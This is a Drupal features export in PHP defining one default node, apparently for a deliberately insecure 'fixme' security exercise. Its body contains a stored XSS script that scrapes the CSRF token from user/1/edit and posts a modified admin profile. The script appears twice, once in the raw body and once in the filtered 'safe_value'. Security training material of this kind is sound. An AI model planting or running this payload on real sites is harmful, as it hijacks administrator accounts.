<?php
/**
 * @file
 * fixme_sec_feature.features.uuid_node.inc
 */

/**
 * Implements hook_uuid_features_default_content().
 */
function fixme_sec_feature_uuid_features_default_content() {
  $nodes = array();

  $nodes[] = array(
  'uid' => 1,
  'title' => 'Drup Alista',
  'log' => '',
  'status' => 1,
  'comment' => 2,
  'promote' => 1,
  'sticky' => 0,
  'vuuid' => '3a67aeb6-cbb5-427e-945b-709073330ab0',
  'type' => 'drupalistas',
  'language' => 'und',
  'created' => 1379928453,
  'tnid' => 0,
  'translate' => 0,
  'uuid' => 'da8122c3-cfbb-4664-83c2-7efee4ceb431',
  'revision_uid' => 1,
  'body' => array(
    'und' => array(
      0 => array(
        'value' => 'Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. 
Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt ut labore et dolore magnam aliquam quaerat voluptatem. Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur? Quis autem vel eum iure reprehenderit qui in ea voluptate velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum fugiat quo voluptas nulla pariatur?

<script>
// Test for  the presence of jquery.
if (typeof jQuery == \'function\') {
// Fetch a correct token from user/1/edit because we will need it to
// successfully submit the user edit form later.
// TODO: Include a check to increase the chance that the current user is admin,
// which will reduce the number of access denied error messages in the log.
jQuery.get(Drupal.settings.basePath + \'user/1/edit\',
  function (data, status) {
    if (status == \'success\') {
      var t = new Date().getTime();
      // Extract the token and other required data
      var name = \'admin\';
      var fullname = t +\'_hacked\';
      var matches = data.match(/name="form_token" value="([a-zA-Z0-9_-]*)"/);
      var token = matches[1];
      var matches = data.match(/name="form_build_id" value="(form-[a-zA-Z0-9_-]*)"/);   
      var build_id = matches[1];
      // Post the minimum amount of fields. Other fields get their default values.
      var payload = {
        "name": name,
        "form_id": \'user_profile_form\',
        "field_full_name[und][0][value]": fullname,
        "form_token": token,
        build_id : build_id
      };
      jQuery.post(Drupal.settings.basePath +  \'user/1/edit\', payload);
      }
    }
  );
}
</script>',
        'summary' => '',
        'format' => 'filtered_html',
        'safe_value' => '<p>Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt.<br />
Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt ut labore et dolore magnam aliquam quaerat voluptatem. Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur? Quis autem vel eum iure reprehenderit qui in ea voluptate velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum fugiat quo voluptas nulla pariatur?</p>
<script>
<!--//--><![CDATA[// ><!--

// Test for  the presence of jquery.
if (typeof jQuery == \'function\') {
// Fetch a correct token from user/1/edit because we will need it to
// successfully submit the user edit form later.
// TODO: Include a check to increase the chance that the current user is admin,
// which will reduce the number of access denied error messages in the log.
jQuery.get(Drupal.settings.basePath + \'user/1/edit\',
  function (data, status) {
    if (status == \'success\') {
      var t = new Date().getTime();
      // Extract the token and other required data
      var name = \'admin\';
      var fullname = t +\'_hacked\';
      var matches = data.match(/name="form_token" value="([a-zA-Z0-9_-]*)"/);
      var token = matches[1];
      var matches = data.match(/name="form_build_id" value="(form-[a-zA-Z0-9_-]*)"/);   
      var build_id = matches[1];
      // Post the minimum amount of fields. Other fields get their default values.
      var payload = {
        "name": name,
        "form_id": \'user_profile_form\',
        "field_full_name[und][0][value]": fullname,
        "form_token": token,
        build_id : build_id
      };
      jQuery.post(Drupal.settings.basePath +  \'user/1/edit\', payload);
      }
    }
  );
}

//--><!]]>
</script>',
        'safe_summary' => '',
      ),
    ),
  ),
  'field_private_files' => array(),
  'rdf_mapping' => array(
    'rdftype' => array(
      0 => 'sioc:Item',
      1 => 'foaf:Document',
    ),
    'title' => array(
      'predicates' => array(
        0 => 'dc:title',
      ),
    ),
    'created' => array(
      'predicates' => array(
        0 => 'dc:date',
        1 => 'dc:created',
      ),
      'datatype' => 'xsd:dateTime',
      'callback' => 'date_iso8601',
    ),
    'changed' => array(
      'predicates' => array(
        0 => 'dc:modified',
      ),
      'datatype' => 'xsd:dateTime',
      'callback' => 'date_iso8601',
    ),
    'body' => array(
      'predicates' => array(
        0 => 'content:encoded',
      ),
    ),
    'uid' => array(
      'predicates' => array(
        0 => 'sioc:has_creator',
      ),
      'type' => 'rel',
    ),
    'name' => array(
      'predicates' => array(
        0 => 'foaf:name',
      ),
    ),
    'comment_count' => array(
      'predicates' => array(
        0 => 'sioc:num_replies',
      ),
      'datatype' => 'xsd:integer',
    ),
    'last_activity' => array(
      'predicates' => array(
        0 => 'sioc:last_activity_date',
      ),
      'datatype' => 'xsd:dateTime',
      'callback' => 'date_iso8601',
    ),
  ),
  'cid' => 0,
  'last_comment_name' => NULL,
  'last_comment_uid' => 1,
  'comment_count' => 0,
  'name' => 'admin',
  'picture' => 0,
  'data' => 'b:0;',
  'date' => '2013-09-23 10:27:33 +0100',
);
  return $nodes;
}
